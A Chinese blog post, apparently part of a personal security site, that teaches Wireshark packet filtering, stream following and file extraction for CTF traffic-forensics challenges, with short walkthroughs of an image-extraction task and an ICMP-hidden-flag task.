@@ -1,0 +1,2194 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CTF-流量分析总结, 简简,简简博客,网络安全,计算机,Java开发">
+    <meta name="description" content="在CTF比赛中，对于流量包的分析取证是一种十分重要的题型。通常这类题目都是会提供一个包含流量数据的pcap文件，选手通过该文件筛选和过滤其中无关的流量信息，根据关键流量信息找出flag或者相关线索,一般flag隐藏在某个数据包里面，或者需要">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta http-equiv="Content-Type" content="text/html;charset=gb2312" />
+    <meta name="sogou_site_verification" content="VTcD33rrfd" />
+    <meta name="google-site-verification" content="mHsYpjV9Rl0e0UzjioJFLg8RMtOhxw8HB3D21dIWvmc" />
+	<meta name="referrer" content="unsafe-url">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>CTF-流量分析总结 | 简言之</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+	<!--变灰-->
+	<!-- <link href="http://static.isenyu.cn/file/css/MemorialDay.css"; rel="stylesheet" type="text/css" /> -->
+    <!-- <style type="text/css">
+     html{ filter: grayscale(100%); /* 标准写法 just for IE6-9 */ 
+        -webkit-filter: grayscale(100%); /* webkit 内核支持程度较好 */ 
+        -moz-filter: grayscale(100%); /* 其他内核现在并不支持，为了将来兼容性书写 */ 
+        -ms-filter: grayscale(100%); 
+        -o-filter: grayscale(100%); filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1);
+        filter: url("data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\'><filter id=\'grayscale\'><feColorMatrix type=\'matrix\' values=\'0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0\'/></filter></svg>#grayscale"); /* Firefox 3.5+ */ }
+     </style> -->
+    <link rel="stylesheet" type="text/css" href="https://cdn.staticfile.org/font-awesome/6.0.0/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.staticfile.org/aos/0.1.0/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="https://upcdn.b0.upaiyun.com/libs/jquery/jquery-2.0.3.min.js"></script>
+	<!--valine_人机验证-->
+	<script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+	<script src="/js/Valine-RJyanzheng.js"></script>
+
+    
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="简言之" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img no-lazy src="/medias/logo.png" class="logo-img" alt="">
+                    
+                    <span class="logo-span">简言之</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Home</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-user-secret" style="zoom: 0.6;"></i>
+      
+      <span>Sec</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/Web/">
+          
+          <i class="fab fa-internet-explorer" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Web</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/CTF/">
+          
+          <i class="fas fa-flag" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>CTF</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Crypto/">
+          
+          <i class="fa-solid fa-shield" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Data</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fab fa-java" style="zoom: 0.6;"></i>
+      
+      <span>Java</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/JavaSE/">
+          
+          <i class="fa-solid fa-mug-saucer" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>JavaSE</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/JavaWeb/">
+          
+          <i class="fa-solid fa-globe" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>JavaWeb</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Spring/">
+          
+          <i class="fa-solid fa-leaf" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Spring</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fa-solid fa-desktop" style="zoom: 0.6;"></i>
+      
+      <span>CS</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/CS%E5%9F%BA%E7%A1%80/">
+          
+          <i class="fa-solid fa-server" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>CS基础</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/SQL/">
+          
+          <i class="fas fa-database" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>数据库</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E7%BB%93%E6%9E%84-%E7%AE%97%E6%B3%95/">
+          
+          <i class="fa-solid fa-bezier-curve" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>结构-算法</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/Python/" class="waves-effect waves-light">
+      
+      <i class="fab fa-python" style="zoom: 0.6;"></i>
+      
+      <span>Python</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-layer-group" style="zoom: 0.6;"></i>
+      
+      <span>Others</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/Course/">
+          
+          <i class="fa-solid fa-graduation-cap" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Course</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Share/">
+          
+          <i class="fa-solid fa-crown" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Share~</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Tools/">
+          
+          <i class="fas fa-tools" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Tools~</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>整理</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags/">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>归类</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives/">
+          
+          <i class="fas fa-file-contract" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>归档</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fa-solid fa-paper-plane" style="zoom: 0.6;"></i>
+      
+      <span>交流</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/friends/">
+          
+          <i class="fas fa-venus-mars" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>友链</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/artitalk/">
+          
+          <i class="fa-solid fa-message" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>说说</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/contact/">
+          
+          <i class="fas fa-envelope" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>留言</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about/" class="waves-effect waves-light">
+      
+      <i class="fas fa-id-card-alt" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img no-lazy src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">简言之</div>
+        <div class="logo-desc">
+            
+            悄无声息地变坚强，安静地变优秀！
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Home
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-user-secret"></i>
+			
+			Sec
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/Web/ " style="margin-left:50px";>
+				  
+				   <i class="fab fa-internet-explorer" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Web</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/CTF/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-flag" style="position: absolute;left:28px" ></i>
+			      
+		          <span>CTF</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/Crypto/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-shield" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Data</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fab fa-java"></i>
+			
+			Java
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/JavaSE/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-mug-saucer" style="position: absolute;left:28px" ></i>
+			      
+		          <span>JavaSE</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/JavaWeb/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-globe" style="position: absolute;left:28px" ></i>
+			      
+		          <span>JavaWeb</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/Spring/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-leaf" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Spring</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fa-solid fa-desktop"></i>
+			
+			CS
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/CS%E5%9F%BA%E7%A1%80/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-server" style="position: absolute;left:28px" ></i>
+			      
+		          <span>CS基础</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/SQL/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-database" style="position: absolute;left:28px" ></i>
+			      
+		          <span>数据库</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/%E7%BB%93%E6%9E%84-%E7%AE%97%E6%B3%95/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-bezier-curve" style="position: absolute;left:28px" ></i>
+			      
+		          <span>结构-算法</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/Python/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fab fa-python"></i>
+			
+			Python
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-layer-group"></i>
+			
+			Others
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/Course/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-graduation-cap" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Course</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/Share/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-crown" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Share~</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/Tools/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-tools" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Tools~</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			整理
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/tags/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-bookmark" style="position: absolute;left:28px" ></i>
+			      
+		          <span>归类</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/archives/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-file-contract" style="position: absolute;left:28px" ></i>
+			      
+		          <span>归档</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fa-solid fa-paper-plane"></i>
+			
+			交流
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/friends/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-venus-mars" style="position: absolute;left:28px" ></i>
+			      
+		          <span>友链</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/artitalk/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-message" style="position: absolute;left:28px" ></i>
+			      
+		          <span>说说</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/contact/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-envelope" style="position: absolute;left:28px" ></i>
+			      
+		          <span>留言</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-id-card-alt"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('猜猜密码是什么呢ヾﾉ≧∀≦)o')).toString(CryptoJS.enc.Hex)) {
+                alert('哎呦！密码好像不对哟，将返回主页！');
+                location.href = '/';	
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://img.jwt1399.top//img/20200824172737.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CTF-流量分析总结</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    /*.toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }*/
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+        /* 毛玻璃 */
+        /*background-color: rgba(162,101,228, 0.08);*/
+        /*backdrop-filter: saturate(180%) blur(20px);*/
+        /*目录样式修改*/
+        background-color: rgb(255, 255, 255,0.7);
+        border-radius: 10px;
+        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
+    }
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+                                <span class="chip bg-color">流量分析</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-07-29
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2022-05-17
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.6k
+                </div>
+                
+
+                
+				
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+            
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>在CTF比赛中，对于流量包的分析取证是一种十分重要的题型。通常这类题目都是会提供一个包含流量数据的<code>pcap</code>文件，选手通过该文件筛选和过滤其中无关的流量信息，根据关键流量信息找出flag或者相关线索,一般flag隐藏在某个数据包里面，或者需要从中提取一个文件出来等等，还有wifi的握手包，需要获取wifi密码等。</p>
+<h2 id="附件下载"><a href="#附件下载" class="headerlink" title="附件下载"></a>附件下载</h2><p>本文章涉及的所有题目附件下载地址：<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/18mWo5vn1zp_XbmcQrMOKRA">https://pan.baidu.com/s/18mWo5vn1zp_XbmcQrMOKRA</a><br>提取码：hrc4 </p>
+<h2 id="Wireshark的使用"><a href="#Wireshark的使用" class="headerlink" title="Wireshark的使用"></a>Wireshark的使用</h2><p>下载地址：<a target="_blank" rel="noopener" href="https://www.wireshark.org/download.html">https://www.wireshark.org/download.html</a><br><code>pcap流量包</code>的分析通常是通过图形化的网络嗅探器——<code>Wireshark</code>进行的.<br>Wireshark的基本使用分为数据包筛选、数据包搜索、数据包还原、数据提取四个部分。</p>
+<h3 id="数据包筛选"><a href="#数据包筛选" class="headerlink" title="数据包筛选"></a>数据包筛选</h3><h4 id="筛选ip"><a href="#筛选ip" class="headerlink" title="筛选ip"></a>筛选ip</h4><blockquote>
+<p>源ip筛选</p>
+</blockquote>
+<p><strong>方法一：</strong></p>
+<pre><code>ip.src == 源ip地址
+</code></pre>
+<p><img src="https://img.jwt1399.top//img/20201230113252.png"></p>
+<p><strong>方法二：</strong><br>选中一个源IP是筛选条件的数据包，找到<code>Internet Protocol Version 4</code>下的<code>Source</code>字段。</p>
+<p><img src="https://img.jwt1399.top//img/20201230113315.png"></p>
+<p>右击<code>Source</code>字段，再选择<code>作为过滤器应用</code> –-&gt; 最后点击<code>选中</code>，就可筛选出该源IP的所有包了</p>
+<p><img src="https://img.jwt1399.top//img/20201230113348.png"></p>
+<blockquote>
+<p>目的ip筛选</p>
+</blockquote>
+<p><strong>方法一：</strong></p>
+<pre><code>ip.dst == 目的ip地址
+</code></pre>
+<p><img src="https://img.jwt1399.top//img/20201230113452.png"></p>
+<p><strong>方法二：</strong><br>跟上面源IP筛选方法类似</p>
+<p>选中一个源IP是筛选条件的数据包，找到<code>Internet Protocol Version 4</code>下的<code>Destination</code>字段。</p>
+<p>右击<code>Destination</code>字段，再选择<code>作为过滤器应用</code> –-&gt; 最后点击<code>选中</code>，就可筛选出该目的IP的所有包了</p>
+<h4 id="mac地址筛选"><a href="#mac地址筛选" class="headerlink" title="mac地址筛选"></a>mac地址筛选</h4><pre><code>eth.dst ==A0:00:00:04:C5:84 筛选目标mac地址
+
+eth.addr==A0:00:00:04:C5:84 筛选MAC地址
+</code></pre>
+<h4 id="端口筛选"><a href="#端口筛选" class="headerlink" title="端口筛选"></a>端口筛选</h4><pre><code>tcp.dstport == 80  筛选tcp协议的目标端口为80的流量包
+
+tcp.srcport == 80  筛选tcp协议的源端口为80的流量包
+
+udp.srcport == 80  筛选udp协议的源端口为80的流量包
+</code></pre>
+<h4 id="协议筛选"><a href="#协议筛选" class="headerlink" title="协议筛选"></a>协议筛选</h4><pre><code>tcp  筛选协议为tcp的流量包
+
+udp 筛选协议为udp的流量包
+
+arp/icmp/http/ftp/dns/ip  筛选协议为arp/icmp/http/ftp/dns/ip的流量包
+</code></pre>
+<h4 id="包长度筛选"><a href="#包长度筛选" class="headerlink" title="包长度筛选"></a>包长度筛选</h4><pre><code>udp.length ==20   筛选长度为20的udp流量包
+
+tcp.len &gt;=20  筛选长度大于20的tcp流量包
+
+ip.len ==20  筛选长度为20的IP流量包
+
+frame.len ==20 筛选长度为20的整个流量包
+</code></pre>
+<h4 id="http请求筛选"><a href="#http请求筛选" class="headerlink" title="http请求筛选"></a>http请求筛选</h4><pre><code>请求方法为GET：http.request.method==“GET”        筛选HTTP请求方法为GET的 流量包
+
+请求方法为POST：http.request.method==“POST”      筛选HTTP请求方法为POST的流量包
+
+指定URI：http.request.uri==“/img/logo-edu.gif”  筛选HTTP请求的URL为/img/logo-edu.gif的流量包
+
+请求或相应中包含特定内容：http contains “FLAG”    筛选HTTP内容为/FLAG的流量包
+</code></pre>
+<h3 id="数据包搜索"><a href="#数据包搜索" class="headerlink" title="数据包搜索"></a>数据包搜索</h3><p>在wireshark界面按“Ctrl+F”，可以进行关键字搜索：</p>
+<p><img src="https://img.jwt1399.top//img/20201230113551.png">Wireshark的搜索功能支持正则表达式、字符串、十六进制等方式进行搜索，通常情况下直接使用字符串方式进行搜索。<br><img src="https://img.jwt1399.top//img/20201230113616.png"><br>搜索栏的左边下拉，有分组列表、分组详情、分组字节流三个选项，分别对应wireshark界面的三个部分，搜索时选择不同的选项以指定搜索区域：<br><img src="https://img.jwt1399.top//img/20201230113637.png"><br><img src="https://img.jwt1399.top//img/20201230113647.png"></p>
+<h3 id="数据包还原"><a href="#数据包还原" class="headerlink" title="数据包还原"></a>数据包还原</h3><p>在wireshark中，存在一个追踪流的功能，可以将HTTP或TCP流量集合在一起并还原成原始数据，具体操作方式如下：</p>
+<p>选中想要还原的流量包，右键选中，选择追踪流 – TCP流/UPD流/SSL流/HTTP流。</p>
+<p><img src="https://img.jwt1399.top//img/20201230114031.png"></p>
+<p>可在弹出的窗口中看到被还原的流量信息：<br><img src="https://img.jwt1399.top//img/20201230114048.png"></p>
+<h3 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h3><p>Wireshark支持提取通过http传输（上传/下载）的文件内容，方法如下：<br><strong>自动提取通过http传输的文件内容</strong><br>文件-&gt;导出对象-&gt;HTTP</p>
+<p><img src="https://img.jwt1399.top//img/20201230113852.png"></p>
+<p>在打开的对象列表中找到有价值的文件，如压缩文件、文本文件、音频文件、图片等，点击<code>Save</code>进行保存，或者<code>Save All</code>保存所有对象再进入文件夹进行分析。</p>
+<p><img src="https://img.jwt1399.top//img/20201230114122.png"><strong>手动提取通过http传输的文件内容</strong><br>选中http文件传输流量包，在分组详情中找到<code>data</code>,<code>Line-based text</code>, <code>JPEG File Interchange Format</code>, <code>data:text/html</code>层，鼠标右键点击 – 选中 导出分组字节流。</p>
+<p><img src="https://img.jwt1399.top//img/20201230114216.png">如果是菜刀下载文件的流量，需要删除分组字节流前开头和结尾的X@Y字符，否则下载的文件会出错。鼠标右键点击 – 选中 显示分组字节<br><img src="https://img.jwt1399.top//img/20201230114239.png">在弹出的窗口中设置开始和结束的字节（原字节数开头加3，结尾减3）</p>
+<p><img src="https://img.jwt1399.top//img/20201230114300.png"></p>
+<p>最后点击<code>Save as</code>按钮导出。</p>
+<h2 id="流量分析经典题型"><a href="#流量分析经典题型" class="headerlink" title="流量分析经典题型"></a>流量分析经典题型</h2><p>CTF题型主要分为流量包修复、数据提取、WEB流量包分析、USB流量包分析、无线密码破解和工控流量包分析等等。</p>
+<h3 id="入门题型"><a href="#入门题型" class="headerlink" title="入门题型"></a>入门题型</h3><h4 id="题目：Cephalopod-图片提取"><a href="#题目：Cephalopod-图片提取" class="headerlink" title="题目：Cephalopod(图片提取)"></a>题目：Cephalopod(图片提取)</h4><p>题目来源：XCTF 3rd-HITB CTF-2017<br>考点：图片提取<br>题目信息：(Cephalopod.pcapng)</p>
+<p><img src="https://img.jwt1399.top//img/20201230114329.png">数据包打开，分组字节流查询flag，发现出现了flag.png的字样，但是并没有这个图片文件，往下翻，图片应该在长度较大的流中，追踪tcp流在tcp.stream eq 2处找到图片文件，保存为原始数据</p>
+<p><img src="https://img.jwt1399.top//img/20201230114344.png">删除PNG前面多余部分，保存为1.png<br><img src="https://img.jwt1399.top//img/20201230114411.png"></p>
+<p>得到flag<br><img src="https://img.jwt1399.top//img/20201230114431.png"></p>
+<h4 id="题目：特殊后门-icmp协议信息传输"><a href="#题目：特殊后门-icmp协议信息传输" class="headerlink" title="题目：特殊后门(icmp协议信息传输)"></a>题目：特殊后门(icmp协议信息传输)</h4><p>题目来源：第七届山东省大学生网络安全技能大赛<br>考点：字符串搜索，icmp协议信息传输<br>题目信息：(backdoor++.pcapng)</p>
+<p><img src="https://img.jwt1399.top//img/20201230114448.png" alt="20190804062347863">搜索flag字符串，在icmp中得到提示flagishere</p>
+<p><img src="https://img.jwt1399.top//img/20201230114505.png">之后的每一个icmp包都有含一个flag字符</p>
+<p><img src="https://img.jwt1399.top//img/20201230114526.png"></p>
